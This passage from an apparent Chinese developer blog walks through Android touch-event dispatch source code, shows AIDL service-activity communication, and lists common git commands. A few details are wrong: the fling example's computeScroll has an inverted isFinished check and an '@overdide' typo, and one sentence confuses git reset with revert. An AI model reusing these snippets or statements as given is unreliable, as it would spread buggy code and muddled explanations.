focusTaken = requestFocus(); } if (prepressed) { // The button is being released before we actually // showed it as pressed. Make it show the pressed // state now (before scheduling the click) to ensure // the user sees it. setPressed(true, x, y); } if (!mHasPerformedLongPress &amp;&amp; !mIgnoreNextUpEvent) { // This is a tap, so remove the longpress check removeLongPressCallback(); // Only perform take click actions if we were in the pressed state if (!focusTaken) { // Use a Runnable and post this rather than calling // performClick directly. This lets other visual state // of the view update before click actions start. if (mPerformClick == null) { mPerformClick = new PerformClick(); } if (!post(mPerformClick)) { performClick(); } } } if (mUnsetPressedState == null) { mUnsetPressedState = new UnsetPressedState(); } if (prepressed) { postDelayed(mUnsetPressedState, ViewConfiguration.getPressedStateDuration()); } else if (!post(mUnsetPressedState)) { // If the post failed, unpress right now mUnsetPressedState.run(); } removeTapCallback(); } mIgnoreNextUpEvent = false; break; 所以onClick事件是在ACTION_UP中执行的 而LongClick事件要看ACTION_DOWN了 case MotionEvent.ACTION_DOWN: mHasPerformedLongPress = false; if (performButtonActionOnTouchDown(event)) { break; } // Walk up the hierarchy to determine if we&#39;re inside a scrolling container. boolean isInScrollingContainer = isInScrollingContainer(); // For views inside a scrolling container, delay the pressed feedback for // a short period in case this is a scroll. if (isInScrollingContainer) { mPrivateFlags |= PFLAG_PREPRESSED; if (mPendingCheckForTap == null) { mPendingCheckForTap = new CheckForTap(); } mPendingCheckForTap.x = event.getX(); mPendingCheckForTap.y = event.getY(); postDelayed(mPendingCheckForTap, ViewConfiguration.getTapTimeout()); } else { // Not inside a scrolling container, so show the feedback right away setPressed(true, x, y); checkForLongClick(0, x, y); } break; 关键看checkForLongClick, 不贴代码了，结论是：在ACTION_DOWN事件被捕捉后，系统会开始触发一个postDelayed操作，delay的时间为 ViewConfiguration.getLongPressTimeout() - delayOffset （这个值在Eclair2.1上为500ms），500ms后会触发CheckForLongPress线程的执行： 想想看，LongClick事件是在DOWN时开始计时，500ms假设，OnClick是在UP是发生，所以完全有可能同时发生OnClick和OnLongClick。这里看到当onLongClick的返回值为true时， mHasPerformedLongPress = true ,仔细看ACTION_UP中，如果HasPerformLongPress==true，就不会走到onClick事件里。所以在onLongClickListener里需要返回一个boolean值的原因就这么简单。 if (!mHasPerformedLongPress &amp;&amp; !mIgnoreNextUpEvent) { // This is a tap, so remove the longpress check removeLongPressCallback(); // Only perform take click actions if we were in the pressed state if (!focusTaken) { // Use a Runnable and post this rather than calling // performClick directly. This lets other visual state // of the view update before click actions start. if (mPerformClick == null) { mPerformClick = new PerformClick(); } if (!post(mPerformClick)) { performClick(); } } } 接下来是OnTouchListener，直接上结论: onTouchListener里面的方法是在dispatchTouchEvent里面调用的，并且如果listener里面的onTouch返回true，事件将不会发送给onTouchEvent，因此OnTouchListener势必会优先级高于onClick和onLongClick。 VelocityTrackervelocityTracker = VelocityTracker.obtain()； velocityTracker.addMovement(event); velocityTracker.computeCurrentVelocity(1); velocityTracker.getXVelocity(); velocityTracker.recycle(); 值得注意的是，VelocityTracker内部使用了大量的native方法，所以执行速度比java要快很多。 实现Fling效果private void onFling(float velocityX,float velocityY){ scroller.fling(getScrollX(),getScrollY(),(int)-velocityX (int)-velocityY,minScrollX,maxScrollX, minScrollY,maxScrollY); invalidate(); } @overdide// 这是每个View都有的方法 private void computeScroll(){ if(scroller.isFinished()){ scroller.computeScrollOffset(); scrollTo(scroller.getCurrX(),scroller.getCurrY()); postInvalidateOnAnimation(); } } 捕获双击事件public class MyView extends View { GestureDetector gestureDetector; public MyView(Context context, AttributeSet attrs) { super(context, attrs); // creating new gesture detector gestureDetector = new GestureDetector(context, new GestureListener()); } // skipping measure calculation and drawing // delegate the event to the gesture detector @Override public boolean onTouchEvent(MotionEvent e) { return gestureDetector.onTouchEvent(e); } private class GestureListener extends GestureDetector.SimpleOnGestureListener { @Override public boolean onDown(MotionEvent e) { return true; } // event when double tap occurs @Override public boolean onDoubleTap(MotionEvent e) { float x = e.getX(); float y = e.getY(); Log.d(&quot;Double Tap&quot;, &quot;Tapped at: (&quot; + x + &quot;,&quot; + y + &quot;)&quot;); return true; } } } 最后是关于ViewConfiguration的一些常量获取的静态方法： int getScaledTouchSlop(); (if Math.abs(xx+yy)&gt;mTouchSlop 就可以认为是滑动事件了) /** * 包含了方法和标准的常量用来设置UI的超时、大小和距离 */ public class ViewConfiguration { // 设定水平滚动条的宽度和垂直滚动条的高度，单位是像素px private static final int SCROLL_BAR_SIZE = 10; //定义滚动条逐渐消失的时间，单位是毫秒 private static final int SCROLL_BAR_FADE_DURATION = 250; // 默认的滚动条多少秒之后消失，单位是毫秒 private static final int SCROLL_BAR_DEFAULT_DELAY = 300; // 定义边缘地方褪色的长度 private static final int FADING_EDGE_LENGTH = 12; //定义子控件按下状态的持续事件 private static final int PRESSED_STATE_DURATION = 125; //定义一个按下状态转变成长按状态的转变时间 private static final int LONG_PRESS_TIMEOUT = 500; //定义用户在按住适当按钮，弹出全局的对话框的持续时间 private static final int GLOBAL_ACTIONS_KEY_TIMEOUT = 500; //定义一个touch事件中是点击事件还是一个滑动事件所需的时间，如果用户在这个时间之内滑动，那么就认为是一个点击事件 private static final int TAP_TIMEOUT = 115; /** * Defines the duration in milliseconds we will wait to see if a touch event * is a jump tap. If the user does not complete the jump tap within this interval, it is * considered to be a tap. */ //定义一个touch事件时候是一个点击事件。如果用户在这个时间内没有完成这个点击，那么就认为是一个点击事件 private static final int JUMP_TAP_TIMEOUT = 500; //定义双击事件的间隔时间 private static final int DOUBLE_TAP_TIMEOUT = 300; //定义一个缩放控制反馈到用户界面的时间 private static final int ZOOM_CONTROLS_TIMEOUT = 3000; /** * Inset in pixels to look for touchable content when the user touches the edge of the screen */ private static final int EDGE_SLOP = 12; /** * Distance a touch can wander before we think the user is scrolling in pixels */ private static final int TOUCH_SLOP = 16; /** * Distance a touch can wander before we think the user is attempting a paged scroll * (in dips) */ private static final int PAGING_TOUCH_SLOP = TOUCH_SLOP * 2; /** * Distance between the first touch and second touch to still be considered a double tap */ private static final int DOUBLE_TAP_SLOP = 100; /** * Distance a touch needs to be outside of a window&#39;s bounds for it to * count as outside for purposes of dismissing the window. */ private static final int WINDOW_TOUCH_SLOP = 16; //用来初始化fling的最小速度，单位是每秒多少像素 private static final int MINIMUM_FLING_VELOCITY = 50; //用来初始化fling的最大速度，单位是每秒多少像素 private static final int MAXIMUM_FLING_VELOCITY = 4000; //视图绘图缓存的最大尺寸，以字节表示。在ARGB888格式下，这个尺寸应至少等于屏幕的大小 @Deprecated private static final int MAXIMUM_DRAWING_CACHE_SIZE = 320 * 480 * 4; // HVGA screen, ARGB8888 //flings和scrolls摩擦力度大小的系数 private static float SCROLL_FRICTION = 0.015f; /** * Max distance to over scroll for edge effects */ private static final int OVERSCROLL_DISTANCE = 0; /** * Max distance to over fling for edge effects */ private static final int OVERFLING_DISTANCE = 4; } 来看源码应用层的事件的开始是从Activity.dispatchTouchEvent开始的Activity.dispatchTouchEvent -&gt; getWindow().superDispatchTouchEvent(ev) -&gt; ViewGroup.dispatchTouchEvent(ev) 。ViewGroup.java，删掉一些无关的代码 @Override public boolean dispatchTouchEvent(MotionEvent ev) { boolean handled = false; final int action = ev.getAction(); final int actionMasked = action &amp; MotionEvent.ACTION_MASK; // Handle an initial down. // 1. 在ACTION_DOWN的时候把状态复原 if (actionMasked == MotionEvent.ACTION_DOWN) { // Throw away all previous state when starting a new touch gesture. // The framework may have dropped the up or cancel event for the previous gesture // due to an app switch, ANR, or some other state change. //这里的注释说明了framework在上一次手势中未必能把down - move - up 的整个后续流程全部deliver到，原因ect... 所以这里要确保在一次全新的手势开始之初 clear all states cancelAndClearTouchTargets(ev); resetTouchState(); } // Check for interception. // 2. 判断ViewGroup是否拦截touch事件。当为ACTION_DOWN或者找到能够接收touch事件的子View // 时，由onInterceptTouchEvent(event)决定是否拦截。其他情况，即ACTION_MOVE/ACTION_UP且 // 没找到能够接收touch事件的子View时，直接拦截。 final boolean intercepted; if (actionMasked == MotionEvent.ACTION_DOWN || mFirstTouchTarget != null) { // 这个firstTarget就是子View里面谁第一个站出来说愿意接受 final boolean disallowIntercept = (mGroupFlags &amp; FLAG_DISALLOW_INTERCEPT) != 0; if (!disallowIntercept) { //这个就是requestDisallowInterceptTouchEvent（是child说不允许父元素拦截） intercepted = onInterceptTouchEvent(ev); //这个是正常的流程 ev.setAction(action); // restore action in case it was changed } else { intercepted = false; } } else { // There are no touch targets and this action is not an initial down // so this view group continues to intercept touches. intercepted = true; } //从这里也能看出来，onInterceptTouchEvent的调用时机是第一次ACTION_DOWN。以及在已经有愿意在dispatchTouchEvent里面返回true的child的前提下，所有的后续动作。所以这个父ViewGroup随时可以从子View前拦截Event，或者说在一个gesture中，在已经有View child站出来说愿意承担的前提下，父ViewGroup随时可以在onInterceptXXX中拦截下来 //3. 遍历child的for循环开始 for (int i = childrenCount - 1; i &gt;= 0; i--) { final int childIndex = getAndVerifyPreorderedIndex( childrenCount, i, customOrder); final View child = getAndVerifyPreorderedView( preorderedList, children, childIndex); newTouchTarget = getTouchTarget(child); // mFirstTouchTarget是一个链表，遍历这个链表，如果有任何一个target的child是当前ViewGroup的child，说明找到，直接break出来 if (newTouchTarget != null) { // Child is already receiving touch within its bounds. // Give it the new pointer in addition to the ones it is handling. newTouchTarget.pointerIdBits |= idBitsToAssign; break; } if (dispatchTransformedTouchEvent(ev, false, child, idBitsToAssign)) { // Child wants to receive touch within its bounds. //这个dispatchTransformedTouchEvent就是 mLastTouchDownX = ev.getX(); mLastTouchDownY = ev.getY(); newTouchTarget = addTouchTarget(child, idBitsToAssign); //这个括号里面就是说明有一个child愿意接受event（在dispatchTouchEvent里面返回了true）,addTouchTarget其实是为上一个break服务的，所以每次event传递下来的时候,在这里addTouchTarget，下一次在上面的getTouchTarget就break了。 alreadyDispatchedToNewTouchTarget = true; break; } } /// 遍历child的for循环到此结束。这个for循环有点长，其实只需要关注哪里break出来了，实际上有两处。，g关键在后一处，就是将event交给child,把event针对child调整一下x和y，调用child的dispatchTouchEvent. // Dispatch to touch targets. // 4. 把事件转交给愿意接受的爱谁谁 if (mFirstTouchTarget == null) { // No touch targets so treat this as an ordinary view. handled = dispatchTransformedTouchEvent(ev, canceled, null, TouchTarget.ALL_POINTER_IDS); } else { // Dispatch to touch targets, excluding the new touch target if we already // dispatched to it. Cancel touch targets if necessary. while (target != null) { if (alreadyDispatchedToNewTouchTarget &amp;&amp; target == newTouchTarget) { handled = true; } else { if (dispatchTransformedTouchEvent(ev, cancelChild, target.child, target.pointerIdBits)) { handled = true; } } } } // 把target这个链表走一遍，之要有一个target愿意在dispatchTouchEvent里面返回true，就认为handled并返回 return handled; } 上面的是viewGroup的dispatchTouchEvent，结论是如果子View在dispatchTouchEvent里面返回了true，后续事件都会(所有的，不管是ACTION_DOWN,UP,还是MOVE)通过dispatchTransformedTouchEvent方法传递到child的dispatchTouchEvent（如果child是一个ViewGroup，这样的查找还会继续下去，一直到child是View不是ViewGroup）。 View的dispatchToucheEvent就显得极为简单，每一次Event都会用mOnTouchListener试一下返回值（mOnTouchListener返回true的话不会掉onTouchEvent），onTouchEvent就又变得复杂许多。 View,ViewGroup的dispatchTouchEvent，requestDisAllowInterceptTouchEvent,onTouchEvent这些都是可以有条件的返回true或false的，这些可以override的方法给了程序设计以极大的灵活性。 View的onTouchEvent简单说就是一大堆的switch caseView.java public boolean onTouchEvent(MotionEvent event) { if (clickable || (viewFlags &amp; TOOLTIP) == TOOLTIP) { switch (action) { case MotionEvent.ACTION_UP: if (!mHasPerformedLongPress &amp;&amp; !mIgnoreNextUpEvent) { // This is a tap, so remove the longpress check removeLongPressCallback(); // Only perform take click actions if we were in the pressed state if (!focusTaken) { // Use a Runnable and post this rather than calling // performClick directly. This lets other visual state // of the view update before click actions start. //这段注释其实说到了post这个方法，messageQueue本身是一个个处理的。手指抬起的时候，优先更新UI，点击事件can wait . 比方onClick里面耗时10s，抬起手10s后才看到按钮变成unPressedState，这显然是不合理的 if (!post(mPerformClick)) { //所以我们在onClick里面打断点，堆栈前面从来不是OnTouchEvent performClick(); // 我们喜爱的onClickListener就在这里啦 } } } removeTapCallback(); //Tap就是post一个runnable，run的时候setPressed，再postLongClick mIgnoreNextUpEvent = false; break; case MotionEvent.ACTION_DOWN: // Walk up the hierarchy to determine if we&#39;re inside a scrolling container. boolean isInScrollingContainer = isInScrollingContainer(); // For views inside a scrolling container, delay the pressed feedback for // a short period in case this is a scroll. if (isInScrollingContainer) { mPrivateFlags |= PFLAG_PREPRESSED; if (mPendingCheckForTap == null) { mPendingCheckForTap = new CheckForTap(); } mPendingCheckForTap.x = event.getX(); mPendingCheckForTap.y = event.getY(); postDelayed(mPendingCheckForTap, ViewConfiguration.getTapTimeout()); } else { // Not inside a scrolling container, so show the feedback right away //这是我们常用的onLongClickListener被触发的地方了 setPressed(true, x, y); checkForLongClick(0, x, y); //这里面就是postDelay一个longClickRunnable，时间是ViewConfiguration.getLongPressTimeout()，默认500ms。 } break; case MotionEvent.ACTION_CANCEL: if (clickable) { setPressed(false); } removeTapCallback(); removeLongPressCallback(); mInContextButtonPress = false; mHasPerformedLongPress = false; mIgnoreNextUpEvent = false; mPrivateFlags3 &amp;= ~PFLAG3_FINGER_DOWN; break; case MotionEvent.ACTION_MOVE: // Be lenient about moving outside of buttons //手指滑动的时候挪出了Button的话，取消按压状态 if (!pointInView(x, y, mTouchSlop)) { // Outside button // Remove any future long press/tap checks removeTapCallback(); removeLongPressCallback(); if ((mPrivateFlags &amp; PFLAG_PRESSED) != 0) { setPressed(false); } } break; } return true; //这里很乐观地返回了true } return false; } 之前说的TouchEvent从Activity由上往下传递再往上传递的过程是没有错的DecorView通过Window.callback(其实就是Actvity)开始Activity.java public boolean dispatchTouchEvent(MotionEvent ev) { if (ev.getAction() == MotionEvent.ACTION_DOWN) { onUserInteraction(); } if (getWindow().superDispatchTouchEvent(ev)) { return true; } //如果经历了ViewGroup -&gt; View 都不愿意处理的话，是会丢回Activity的 return onTouchEvent(ev); } 而在ViewGroup那一层，如果交给child.dispatchTouchEvent都不愿处理的话，默认会调用View.dispatchTouchEvent，这里面多半会调到自己的onTouchEvent。所以Activity -&gt; ViewGroup -&gt; View -&gt; ViewGroup -&gt; Activity这一个流程是没错的。难点就在于这个ViewGroup -&gt; View的层级有多深。在ViewGroup里面，往子View下发TouchEvent的唯一途径是dispatchTransformedTouchEvent。这个方法的调用次数也不多，估计就是在这里控制住的。 TouchEvent只是java层的抽象Linux内核会将硬件产生的触摸事件包装为Event存到/dev/input/event[x]目录下当屏幕被触摸，Linux内核会将硬件产生的触摸事件包装为Event存到/dev/input/event[x]目录下。对，你没看错，事件被搞成文件保存了下来！接着，系统创建的一个InputReaderThread线程loop起来让EventHub调用getEvent()不断的从/dev/input/文件夹下读取输入事件。然后InputReader则从EventHub中获得事件交给InputDispatch。而InputDispatch又会把事件分发到需要的地方，比如ViewRootImpl的WindowInputEventReceiver中。以上过程是在底层中完成，大部分由c++实现，我们了解流程就好 7. 从cpp层到java层的转换从底层cpp说去从cpp层讲到java层 ​ 8. MotionEvent.getAction和MotionEvent.getActionMasked的区别先来看下这些数分别是多少 ACTION_MASK 0x000000ff (0x表示16进制，两个数代表一个byte,8位，所以都是Int) ACTION_DOWN 0x00000000 ACTION_UP 0x00000001 ACTION_MOVE 0x00000002 ACTION_POINTER_DOWN 0x00000005 ACTION_POINTER_UP 0x00000006 ACTION_POINTER_1_DOWN 0x00000005 ACTION_POINTER_1_UP 0x00000006 ACTION_POINTER_2_DOWN 0x00000105 ACTION_POINTER_2_UP 0x00000106 ACTION_POINTER_3_DOWN 0x00000205 ACTION_POINTER_3_UP 0x00000206 public final int getAction() { return nativeGetAction(mNativePtr); } public final int getActionMasked() { return nativeGetAction(mNativePtr) &amp; ACTION_MASK; } public final int getActionIndex() { return (nativeGetAction(mNativePtr) &amp; ACTION_POINTER_INDEX_MASK) &gt;&gt; ACTION_POINTER_INDEX_SHIFT; } 我们发现单指DOWN/UP分别为 0x005和0x006, 而双值和三指DOWN/UP分别为 0x105和0x106,0x205和0x206假设当前触摸动作为ACTIONPOINTER2_DOWN时， int action=0x105; int maskAction=0x0ff&amp;0x105; // maskAction=0x005; 如此，触摸动作含义改变为ACTIONPOINTERDOWN。三根手指同时move汇集到应用层，接收到的是ACTION_POINTER_3_MOVE.结论是，getActionIndex就是获取 0x00000206 里面那个2，也就是第几根手指上去的。getActionMasked就是，我不管你是1根手指DOWN，2根手指DOWN还是3根手指DOWN上去，mask之后全部变成ACTION_DOWN。所以一般来说，ACTION_POINTER_2_DOWN这一类的东西通常用于多点触控。一个Int 4个byte，第三个byte保存index（第几根手指），第四个byte保存类型（DOWN,MOVE还是别的什么） 如果View没有消费ACTION_DOWN事件，则之后的ACTION_MOVE等事件都不会再接收。 另外,addTouchTarget方法在遍历当前child过程中只要找到一个就break当前遍历，所以正常情况下，这个链表只会有一歌个。但是，这个遍历外面还包裹了一个``` actionMasked == MotionEvent.ACTION_DOWN || (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_DOWN) || actionMasked == MotionEvent.ACTION_HOVER_MOVE 所以，假如一开始一根手指上去，发生了ACTION_DOWN，随后这只手指不放开，再上去一根手指，就触发了ACTION_POINTER_DOWN，又会去遍历，并可能调用addTouchTarget方法，TouchTarget里面有一个成员遍历pointerIdBits，可以认为是绑定的这根手指的id。另外，在dispatchTouchEvent最一开始是会将之前保留的touchTarget队列清空的，在ACTION_UP里面也做了 if (actionMasked == MotionEvent.ACTION_DOWN) { // Throw away all previous state when starting a new touch gesture. // The framework may have dropped the up or cancel event for the previous gesture // due to an app switch, ANR, or some other state change. cancelAndClearTouchTargets(ev); resetTouchState(); } Reference 图解安卓事件分发机制 making sense of the touch system Android onTouchEvent, onClick及onLongClick的调用机制 Android触摸事件机制(三) ViewConfiguration用法 触摸事件的分析与总结 View事件分发及消费源码分析看这篇文章就够了","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"service和activity的通信方式","date":"2016-09-30T15:25:28.000Z","path":"2016/09/30/service-activity-communication/","text":"一年以前写过一篇关于service和Activity相互通信的很详细的博客，当时真的是费了很大心思在上面。现在回过头来看，还是有些不完善的地方，比如aidl没有给，demo不够全面。现在补上。 1. 关于Android的Service，官方文档是这样描述的 Service 是一个可以在后台执行长时间运行操作而不使用用户界面的应用组件。服务可由其他应用组件启动，而且即使用户切换到其他应用，服务仍将在后台继续运行。 此外，组件可以绑定到服务，以与之进行交互，甚至是执行进程间通信 (IPC)。 例如，服务可以处理网络事务、播放音乐，执行文件 I/O 或与内容提供程序交互，而所有这一切均可在后台进行。 这其中也能看出Android对于Service角色的定位，后台工作，不涉及UI。 Service本身包含started Service和Binded Service 对于Binded Service 使用 2. AIDL写法以下代码来自简书 interface IMyAidlInterface { /** * Demonstrates some basic types that you can use as parameters * and return values in AIDL. */ void basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString); String getName(String nickName); } public class AIDLService extends Service { IMyAidlInterface.Stub mStub = new IMyAidlInterface.Stub() { //这个class是编译后生成的 @Override public void basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString) throws RemoteException { } @Override public String getName(String nickName) throws RemoteException { return &quot;aidl &quot; + nickName; } }; @Nullable @Override public IBinder onBind(Intent intent) { return mStub; } } public class MainActivity extends AppCompatActivity { private Button mBtnAidl; private IMyAidlInterface mIMyAidlInterface; ServiceConnection mServiceConnection = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { mIMyAidlInterface = IMyAidlInterface.Stub.asInterface(service); //在这里获得远程服务的proxy引用 } @Override public void onServiceDisconnected(ComponentName name) { } }; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mBtnAidl = (Button) findViewById(R.id.btn_aidl); bindService(new Intent(MainActivity.this, AIDLService.class), mServiceConnection, BIND_AUTO_CREATE); mBtnAidl.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { if(mIMyAidlInterface != null){ try { String name = mIMyAidlInterface.getName(&quot;I&#39;m nick&quot;); Toast.makeText(MainActivity.this, &quot;name = &quot; + name, Toast.LENGTH_SHORT).show(); } catch (RemoteException e) { e.printStackTrace(); } } } }); } } 需要注意的是，aidl不一定非得多进程才能用，同一进程之间的不同组件之间也能用aidl，而且，framework会判断如果是当前进程，直接返回在当前进程的引用。 客户端调用远程进程的流程：服务端跨进程的类都要继承Binder类。我们所持有的Binder引用(即服务端的类引用)并不是实际真实的远程Binder对象，我们的引用在Binder驱动里还要做一次映射。也就是说，设备驱动根据我们的引用对象找到对应的远程进程。客户端要调用远程对象函数时，只需把数据写入到Parcel，在调用所持有的Binder引用的transact()函数，transact函数执行过程中会把参数、标识符（标记远程对象及其函数）等数据放入到Client的共享内存，Binder驱动从Client的共享内存中读取数据，根据这些数据找到对应的远程进程的共享内存，把数据拷贝到远程进程的共享内存中，并通知远程进程执行onTransact()函数，这个函数也是属于Binder类。远程进程Binder对象执行完成后，将得到的写入自己的共享内存中，Binder驱动再将远程进程的共享内存数据拷贝到客户端的共享内存，并唤醒客户端线程。 参考Binder学习心得","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"service","slug":"service","permalink":"https://haldir65.github.io/tags/service/"}]},{"title":"git常用操作手册","date":"2016-09-27T17:24:51.000Z","path":"2016/09/27/git-manual/","text":"记录一下常用git的命令，作为日常使用的参考手册 1. 在本地创建一个项目并同步到github的过程$ mkdir ~/hello-world //创建一个项目hello-world $ cd ~/hello-world //打开这个项目 $ git init //初始化 $ touch README //创建文件 $ git add README //更新README文件 $ git commit -m &#39;first commit&#39; //提交更新，并注释信息“first commit” $ git remote add origin git@github.test/hellotest.git //连接远程github项目 $ git push -u origin master //将本地项目更新到github项目上去 2. 将本地git branch和远程github repository同步可行的方式 git branch --set-upstream local_branch origin/remote_branch 这样做可行，但出现下面的错误提示，照着操作就行了。 $ git branch --set-upstream master origin/master The --set-upstream flag is deprecated and will be removed. Consider using --track or --set-upstream-to Branch master set up to track remote branch master from origin. 直接拿下面这段就行了如果已经clone下来，想要在本地创建一个和远程分支对应的local分支。 git branch –track dev origin/dev &amp;&amp; git checkout dev 3. git处理大小写字母的问题 git默认对大小写不敏感，所以，新建一个文件adapter.java，上传到github之后说不定就给变成了Adapter.java。在windows下面将已经push到远端的文件，改变其文件名的大小写时，git默认会认为文件没有发生任何改动，从而拒绝提交和推送，原因是其默认配置为大小写不敏感，故须在bash下修改配置： git config core.ignorecase false 4. git设置用户名$ git config --global user.name &quot;name&quot; $ git config --global user.email xxx@163.com 这样可以为git所有的仓库设置用户名，如果想为指定仓库设置用户名或email: $ git config user.name &quot;name&quot; $ git config user.email &quot;myEmail.awesome.com&quot; 查看当前用户名或email $ git config user.name $ git config user.email 5. 设置代理只针对当前项目设置代理 git config http.proxy socks5://127.0.0.1:1080 git config https.proxy socks5://127.0.0.1:1080 设置全局代理 git config --global http.proxy socks5://127.0.0.1:1080 git config --global https.proxy socks5://127.0.0.1:1080 取消设置 git config --global --unset http.proxy git config --global --unset https.proxy 对指定url设置代理git config –global http.&lt;要设置代理的URL&gt;.proxy socks5://127.0.0.1:1080 git config –global http.https://github.com.proxy socks5://127.0.0.1:1080 export http_proxy=socks5://127.0.0.1:8118; export https_proxy=$http_proxy然后在当前shell中就可以直接进行clone操作了，git这类软件会自动读取当前环境变量中的http_proxy和https_proxy值，并且，这个环境变量只在当前shell中有效 6. 对上一次commit进行修改(在不添加新的commit的基础上)git commit --amend 7. git revert和reset的区别 reset 是在正常的commit历史中,删除了指定的commit,这时 HEAD 是向后移动了,而 revert 是在正常的commit历史中再commit一次,只不过是反向提交,他的 HEAD 是一直向前的. 即reset是通过一次反向的commit操作撤销之前的commit，而reset则会直接从提交历史里删除commit。如果还没有push，用reset可以在本地解决问题，之后重新commit再push。如果已经push，可以考虑通过一次revert来实现“撤销”的效果。 语法： resetgit reset --hard HEAD //本地仓库文件修改也会消失 git reset --soft HEAD //本地文件修改不会消失，类似于回到git add 之前的状态(把绿色的改成红色) git reset --hard HEAD~3 //最近的三次提交全部撤销 git reset --soft HEAD~ //把最近一次本地提交撤销，上次提交的文件修改还在，等于变成红色的状态 如何撤销最近一次本地提交 $ git commit -m &quot;Something terribly misguided&quot; # (1) $ git reset HEAD~ # (2) &lt;&lt; edit files as necessary &gt;&gt; # (3) $ git add ... # (4) $ git commit -c ORIG_HEAD # (5) ORIG_HEAD意思是把上一次的commit message带上，同时提供一个editor供修改 revertgit revert c011eb3c20ba6fb38cc94fe //之后在分支图上就能看到一个新的反向的commit，push即可。 8. 切分支, 删除分支本地新建分支 git checkout -b &lt;branchName&gt; 将这条分支与远程同步的方式 git branch --set-upstream &lt;laocalBranchName&gt; origin/&lt;RemoteBranchName&gt; // 或者 git branch -u origin/dev 直接从远程仓库切一个分支出来并保持同步的方式 git checkout -b &lt;branchName&gt; origin/&lt;branchName&gt; git checkout --track origin/dev 删除远程分支: git push origin --delete &lt;branchName&gt; 删除远程tag git push origin --delete tag &lt;tagName&gt; 顺便说一下打tag，这个实在太简单 git tag //看下当前仓库有哪些tags git tag myTag // 在当前head打一个myTag的标签 git push origin myTag //刚才那个tag还只是在本地，需要提交到远程 git checkout myTag //打tag的好处就在于埋下一个里程碑，你随时可以回到当时的状态 git tag -d myTag //删除这个tag也很简单 git tag -a myTag adjksdas31231//假如当前head不在想打的位置，找到想打的位置的log，照着打就好 git push origin -tags //将本地所有标签一次性提交到git服务器 git ls-remote --tags origin //查看远程仓库所有的tags 9. pull和rebase的区别pull = fetch +merge ，会生成新的提交 Merge好在它是一个安全的操作。现有的分支不会被更改，避免了rebase潜在的缺点 git pull –rebase = git pull -r git merge –no-ff //能够 fast forward的merge，但是我还是希望能够保留历史git merge –squash //要合过来的分之上的提交乱七八糟，统一做成一个commit，这里需要做一次提交 10. rebase和cherry-pickrebase不会生成新的提交，而且会使得项目提交历史呈现出完美的线性。但注意不要在公共的分支上使用 11. gitignore文件写法参考repo # 忽略所有以 .c结尾的文件 *.c # 但是 stream.c 会被git追踪 !stream.c # 只忽略当前文件夹下的TODO文件, 不包括其他文件夹下的TODO例如: subdir/TODO /TODO # 忽略所有在build文件夹下的文件 build/ # 忽略 doc/notes.txt, 但不包括多层下.txt例如: doc/server/arch.txt doc/*.txt # 忽略所有在doc目录下的.pdf文件 doc/**/*.pdf # 让ignore文件立即生效的方法（如果不该上传到服务器的东西已经上传了，本次提交会把这些不该上传的东西从服务器删掉） git rm -r --cached . git add . git commit -m &quot;.gitignore is now working&quot; 12. git stash常用命令 git stash //保存下来，压进一个栈，基本上就是先进后出了 git stash pop //推出一个栈 git stash save -a &quot;message to add&quot; // 添加一次stash，打上标记 git stash list //展示当前仓库所有的被stash的变更以及对应的id，记得这个不是跟着branch走的 git stash drop stah@{id} // 从stash的List中删除指定的某一次stash git stash apply &lt;stash@{id}&gt; //应用某一次的stash git stash clear// 一次性删除stash List中所有的item 13. 强推谨慎使用 # Be very careful with this command! git push --force 14.既然是shell环境，那当然可以写bash 脚本 git add . &amp;&amp; git commit -m “stuff” &amp;&amp; git push 一部搞定，前提是每一步都得成功，原理就是bash脚本的&amp;&amp;和||操作符。 15. git-error-please-make-sure-you-have-the-correct-access-rights-and-the-reposito总会有不小心的时候把本地的sshkey干掉了，解决方法就是本地生成sshkey，然后粘贴到你的github或者gitlab网站上 ssh-keygen ## 这个基本上在网上都能找到，可以传参数，生成的文件名，密码什么的cat ~/.ssh/id_rsa.pub | clip ## 中间的管道是把内容搞到剪切板上，clip是windows上的命令去粘贴吧 一台电脑上存储两个github账号的ssh的方式 $ cd ~/.ssh$ ssh-keygen -t rsa -C “your_email@associated_with_githubPersonal.com” save it as id_rsa_personal when prompted$ ssh-keygen -t rsa -C “your_email@associated_with_githubWork.com” save it as id_rsa_work when prompted ssh-keygen -R “[x.x.x.x]:22” //之前通过ssh-kengen记住的，这个R是remove的意思 由此创建四个文件：id_rsa_personalid_rsa_personal.pub ## 这里面的内容是要粘到github账户setting里面的id_rsa_workid_rsa_work.pub touch config，添加如下内容 #githubPersonal Host personal HostName github.com User git IdentityFile ~/.ssh/id_rsa_personal # githubWork Host work HostName github.com User git IdentityFile ~/.ssh/id_rsa_work 另外,确保只有owner有读写权限chmod 600 ~/.ssh/config error:Could not open a connection to your authentication agent. ssh-agent bash ssh-add -D一台电脑上同时要添加github和gitlab的权限，或者一台电脑上要同时添加两个github账户的权限 ssh-keygen -t rsa -C “your_email@youremail.com”$ ssh-add id_rsa_personal$ ssh-add id_rsa_workssh-add -lssh -Tv personalssh -Tv work似乎这样就行了，就可以用git@xxxx去clone并且push了（记得在github账户的setting里面把.pub文件里面的内容粘贴进去） 如何避免每次都得输入ssh-add id_rsaxxx的现象手动将clone下来的Git仓库的origin改成下面这种是可以的 然后每次clone的时候，不能用 git clone git@github.com:gothinkster/node-express-realworld-example-app.gitgit clone git@personal:gothinkster/node-express-realworld-example-app.git ### 改成这样就好啦 Error: Permission denied (publickey)的解决方案ssh -vT git@github.com ## 会输出详细的信息multiple github accountDigital ocean关于.ssh/config文件的解释非常好 详细的关于如何用ssh管理多个github账户的教程 16. 空目录推送到远端常常在node项目中看到一个static文件夹，里面只有一个.gitkeep文件，这个文件的意思是，就算这个目录是空的，也得推送到远端。 17. stale和prune的概念prune(stale的概念 - 一个原本分支叫做dev，远程叫origin/dev，如果删除了dev，合到master，提交到origin/master之后，远程的origin/dev就成了stale的了)man prune是这么说的： Deletes all stale tracking branches under .These stale branches have already been removed from the remote repositoryreferenced by , but are still locally available in “remotes/“. prune的解释 一些看上去很神奇的操作git clone 